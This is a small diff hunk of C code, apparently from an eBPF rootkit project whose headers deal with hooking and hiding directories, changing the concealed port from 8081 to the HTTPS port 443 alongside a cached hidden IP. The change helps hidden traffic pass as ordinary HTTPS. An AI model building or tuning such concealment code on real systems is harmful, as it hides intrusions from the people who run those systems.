@@ -4,7 +4,7 @@
 #include "../include/bpf_hook.h"
 #include "../include/hiding_directory_def.h"
 
-#define HIDDEN_PORT     8081
+#define HIDDEN_PORT     443
 #define PID_MAX_VALUE   4194304U
 
 static __be32 hidden_ip_cached = 0;
